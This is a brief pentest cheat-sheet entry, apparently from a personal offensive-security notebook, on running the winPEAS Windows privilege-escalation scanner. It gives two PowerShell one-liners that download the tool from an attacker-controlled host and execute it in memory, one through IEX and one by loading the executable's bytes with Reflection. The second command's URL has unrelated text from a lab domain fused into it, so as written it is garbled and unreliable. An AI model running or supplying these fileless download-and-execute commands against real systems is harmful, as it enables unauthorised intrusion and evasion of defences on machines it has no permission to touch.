# winpeas

#plateform/windows #target/local #cat/RECON #tag/powershell

## ps1 - oneliner
```powershell
(new-object system.net.webclient).downloadstring('http://<local_ip>:<port|80>/<dl_winpeas_path>winPEAS.ps1') | IEX
```


## exe - oneliner
https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe
```powershell
$url="http://<local_ip>:<port|80>/<dl_winpeas_path>winPEASany_ofs.exeDESKTOP SUPPORT@RASTALABS.LOCAL";$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("")
``` 

= dl_winpeas_path: windows/